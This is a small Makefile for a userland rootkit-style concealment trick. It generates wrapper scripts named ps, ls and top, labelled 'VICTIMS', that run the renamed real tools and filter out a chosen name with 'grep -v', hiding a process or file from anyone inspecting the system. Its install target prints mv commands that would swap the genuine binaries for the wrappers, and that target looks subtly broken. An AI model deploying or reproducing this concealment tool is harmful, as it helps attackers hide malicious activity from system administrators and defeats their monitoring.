PROG=WHAT_YOU_WANT_TO_HIDE
VICTIMS=ps ls top

.PHONY: all $(VICTIMS) install

all: $(VICTIMS)

$(VICTIMS):
	@echo "Generate tool: $@ ..."
	@echo "#! /bin/sh" > $@
	@echo $$(dirname $$(which $@))/_$@ $$\@ " | grep -v '$(PROG)'">> $@
	@chmod +x $@

install:
	@for p in $(VICTIMS); do \
		echo mv $$(which $$p) $$(dirname $$(which $@))/_$$p; \
	done

.PHONY: clean

clean:
	rm -f $(VICTIMS)
